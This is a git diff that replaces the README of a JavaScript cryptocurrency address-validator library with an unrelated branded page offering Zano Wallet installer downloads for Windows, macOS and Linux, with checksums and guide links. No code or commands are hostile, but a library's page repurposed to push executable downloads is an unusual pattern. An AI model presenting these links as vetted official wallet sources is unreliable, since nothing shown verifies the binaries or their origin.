@@ -1,137 +1,77 @@
-# wallet-address-validator
-Simple wallet address validator for validating Bitcoin and other altcoins addresses in **Node.js and browser**.
+<p align="center"><img src="https://raw.githubusercontent.com/zano-projects/Zano-Wallet/main/learn/assets/01-zano-wallet-brand.webp" alt="Zano Wallet - desktop privacy wallet for Zano" width="100%"></p>
 
-Forked from [ryanralph/altcoin-address](https://github.com/ryanralph/altcoin-address).
+<h1 align="center">Zano Wallet</h1>
+<p align="center"><b>The desktop privacy wallet for Zano: private payments, staking, aliases and confidential assets.</b></p>
 
-**File size is ~22 kB (minifed and gzipped)**.
+<p align="center">
+<a href="https://zanowallet.io/"><img src="https://img.shields.io/badge/Website-zanowallet.io-7c5cff?style=for-the-badge" alt="Zano Wallet website"></a>
+<a href="https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4"><img src="https://img.shields.io/badge/Release-v2.0.4-1f2a6b?style=for-the-badge" alt="Zano Wallet v2.0.4 release"></a>
+<a href="https://github.com/zano-projects/Zano-Wallet/tree/main/learn"><img src="https://img.shields.io/badge/Guides-Zano%20Wallet%20Learn-3b2a8f?style=for-the-badge" alt="Zano Wallet guides"></a>
+</p>
 
-## Installation
+---
 
-### NPM
-```
-npm install wallet-address-validator
-```
+## Download Zano Wallet v2.0.4
 
-### Browser
-```html
-<script src="wallet-address-validator.min.js"></script>
-```
+<p align="center">
+<a href="https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4-installer.exe"><img src="https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Download Zano Wallet for Windows"></a>
+<a href="https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.dmg"><img src="https://img.shields.io/badge/Download-macOS-111111?style=for-the-badge&logo=apple&logoColor=white" alt="Download Zano Wallet for macOS"></a>
+<a href="https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.zip"><img src="https://img.shields.io/badge/Download-Linux-E95420?style=for-the-badge&logo=linux&logoColor=white" alt="Download Zano Wallet for Linux"></a>
+</p>
 
-## API
+| Platform | File | Version |
+|---|---|---|
+| Windows | [zano-wallet-2.0.4-installer.exe](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4-installer.exe) | v2.0.4 |
+| macOS | [zano-wallet-2.0.4.dmg](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.dmg) | v2.0.4 |
+| Linux | [zano-wallet-2.0.4.zip](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.zip) | v2.0.4 |
 
-##### validate (address [, currency = 'bitcoin'[, networkType = 'prod']])
+<!-- SHA256:START -->
+### SHA-256 checksums
 
-###### Parameters
-* address - Wallet address to validate.
-* currency - Optional. Currency name or symbol, e.g. `'bitcoin'` (default), `'litecoin'` or `'LTC'`
-* networkType - Optional. Use `'prod'` (default) to enforce standard address, `'testnet'` to enforce testnet address and `'both'` to enforce nothing.
+| File | SHA-256 |
+|---|---|
+| zano-wallet-2.0.4-installer.exe | `878d013aeee7ff90cae8be10d7e194e5fdec61c8d0f543f0f88244dc32e9cd5d` |
+| zano-wallet-2.0.4.dmg | `5b29381d6951b426670965900e9f53f04fa994523be85e159fe30ed95f0b0541` |
+| zano-wallet-2.0.4.zip | `7204efbc336c803b5e17687c8f362a90541967fb34ad2fddf371465a82e17038` |
 
-> Returns true if the address (string) is a valid wallet address for the crypto currency specified, see below for supported currencies.
+Check on Windows: `certutil -hashfile <file> SHA256` · macOS: `shasum -a 256 <file>` · Linux: `sha256sum <file>`. Every character must match; if one differs, delete the file and download it again.
+<!-- SHA256:END -->
 
-### Supported crypto currencies
+---
 
-* Auroracoin/AUR, `'auroracoin'` or `'AUR'`
+## What Zano Wallet does
 
-* Bankex/BKX, `'bankex'` or `'BKX'`
-* BeaverCoin/BVC, `'beavercoin'` or `'BVC'`
-* Biocoin/BIO, `'biocoin'` or `'BIO'`
-* Bitcoin/BTC, `'bitcoin'` or `'BTC'`
-* BitcoinCash/BCH, `'bitcoincash'` or `'BCH'`
-* BitcoinGold/BTG, `'bitcoingold'` or `'BTG'`
-* BitcoinPrivate/BTCP, `'bitcoinprivate'` or `'BTCP'`
-* BitcoinZ/BTCZ, `'bitcoinz'` or `'BTCZ'`
+| Feature | What you get |
+|---|---|
+| Private by default | Hidden senders, receivers and amounts on every transfer ([privacy](https://zanowallet.io/what-is-zano/)) |
+| Staking | Earn proof-of-stake rewards from your desktop ([staking](https://zanowallet.io/features/staking/)) |
+| Aliases | Send to a readable @name ([aliases](https://zanowallet.io/features/alias/)) |
+| Confidential assets | Hold private tokens next to ZANO ([assets](https://zanowallet.io/features/confidential-assets/)) |
+| Self-custody | No account, no KYC, your keys only ([no-KYC wallet](https://zanowallet.io/no-kyc-wallet/)) |
 
-* Callisto/CLO, `'callisto'` or `'CLO'`
+## Guides
 
-* Dash, `'dash'` or `'DASH'`
-* Decred/DCR, `'decred'` or `'DCR'`
-* Digibyte/DGB, `'digibyte'` or `'DGB'`
-* Dogecoin/DOGE, `'dogecoin'` or `'DOGE'`
+| Guide | Topic |
+|---|---|
+| [How to Install Zano Wallet on Windows 10 and 11](https://github.com/zano-projects/Zano-Wallet/blob/main/learn/how-to/install-zano-wallet-windows.md) | Windows setup |
+| [How to Install Zano Wallet on macOS](https://github.com/zano-projects/Zano-Wallet/blob/main/learn/how-to/install-zano-wallet-macos.md) | macOS setup |
+| [How to Install Zano Wallet on Linux](https://github.com/zano-projects/Zano-Wallet/blob/main/learn/how-to/install-zano-wallet-linux.md) | Linux setup |
+| [Zano Wallet Sync Stuck at 0% or Not Moving](https://github.com/zano-projects/Zano-Wallet/blob/main/learn/how-to/zano-wallet-sync-stuck.md) | Sync problems |
+| [Restore a Zano Wallet From Your Seed Phrase](https://github.com/zano-projects/Zano-Wallet/blob/main/learn/how-to/restore-zano-wallet-from-seed.md) | Recovery |
+| [How to Stake ZANO in the Desktop Wallet](https://github.com/zano-projects/Zano-Wallet/blob/main/learn/how-to/stake-zano-in-wallet.md) | Staking |
+| [Zano Confidential Assets Explained](https://github.com/zano-projects/Zano-Wallet/blob/main/learn/how-to/zano-confidential-assets.md) | Assets |
+| [Avoid Fake Zano Wallet Downloads](https://github.com/zano-projects/Zano-Wallet/blob/main/learn/how-to/avoid-fake-zano-wallet-sites.md) | Safety |
 
-* Ethereum/ETH, `'ethereum'` or `'ETH'`
-* EthereumClassic/ETH, `'ethereumclassic'` or `'ETC'`
-* EthereumZero/ETZ, `'etherzero'` or `'ETZ'`
+Browse all 38 guides in [Zano Wallet Learn](https://github.com/zano-projects/Zano-Wallet/tree/main/learn).
 
-* Freicoin/FRC, `'freicoin'` or `'FRC'`
+> [!TIP]
+> Sync stuck, crashes, or a lost wallet file? Install the [latest release](https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4) and restore with your seed phrase.
 
-* Garlicoin/GRLC, `'garlicoin'` or `'GRLC'`
+> [!WARNING]
+> Nobody will ever ask for your seed phrase. Download only from this release page or [zanowallet.io](https://zanowallet.io/download/).
 
-* Hush/HUSH, `'hush'` or `'HUSH'`
+---
 
-* Komodo/KMD, `'komodo'` or `'KMD'`
+Zano Wallet is built by Zano Wallet LLC, working directly under Zano Foundation contracts. Mobile app coming soon.
 
-* Litecoin/LTC, `'litecoin'` or `'LTC'`
-
-* Megacoin/MEC, `'megacoin'` or `'MEC'`
-
-* Monero/XMR, `'monero'` or `'XMR'`
-
-* Namecoin/NMC, `'namecoin'` or `'NMC'`
-* Nano/NANO, `'nano'` or `'NANO'`
-* NEO/NEO, `'NEO'` or `'NEO'`
-* NeoGas/GAS, `'neogas'` or `'GAS'`
-
-* Peercoin/PPCoin/PPC, `'peercoin'` or `'PPC'`
-* Primecoin/XPM, `'primecoin'` or `'XPM'`
-* Protoshares/PTS, `'protoshares'` or `'PTS'`
-
-* Qtum/QTUM, `'qtum'` or `'QTUM'`
-
-* Raiblocks/XRB, `'raiblocks'` or `'XRB'`
-* Ripple/XRP, `'ripple'` or `'XRP'`
-
-* Snowgem/SNG, `'snowgem'` or `'SNG'`
-
-* Vertcoin/VTC, `'vertcoin'` or `'VTC'`
-
-* Votecoin/VTC, `'votecoin'` or `'VOT'`
-
-* Zcash/ZEC, `'zcash'` or `'ZEC'`
-
-* Zclassic/ZCL, `'zclassic'` or `'ZCL'`
-
-* ZenCash/ZEN, `'zencash'` or `'ZEN'`
-
-
-### Usage example
-
-#### Node
-```javascript
-var WAValidator = require('wallet-address-validator');
-
-var valid = WAValidator.validate('1KFzzGtDdnq5hrwxXGjwVnKzRbvf8WVxck', 'BTC');
-if(valid)
-	console.log('This is a valid address');
-else
-	console.log('Address INVALID');
-
-// This will log 'This is a valid address' to the console.
-```
-
-```javascript
-var WAValidator = require('wallet-address-validator');
-
-var valid = WAValidator.validate('1KFzzGtDdnq5hrwxXGjwVnKzRbvf8WVxck', 'litecoin', 'testnet');
-if(valid)
-      console.log('This is a valid address');
-else
-      console.log('Address INVALID');
-
-// As this is a invalid litecoin address 'Address INVALID' will be logged to console.
-```
-
-#### Browser
-```html
-<script src="wallet-address-validator.min.js"></script>
-```
-
-```javascript
-// WAValidator is exposed as a global (window.WAValidator)
-var valid = WAValidator.validate('1KFzzGtDdnq5hrwxXGjwVnKzRbvf8WVxck', 'bitcoin');
-if(valid)
-    alert('This is a valid address');
-else
-    alert('Address INVALID');
-
-// This should show a pop up with text 'This is a valid address'.
-```
+<p align="center"><a href="https://zanowallet.io/">zanowallet.io</a> · <a href="https://zanowallet.io/faq/">FAQ</a> · <a href="https://zanowallet.io/security/">Security</a></p>
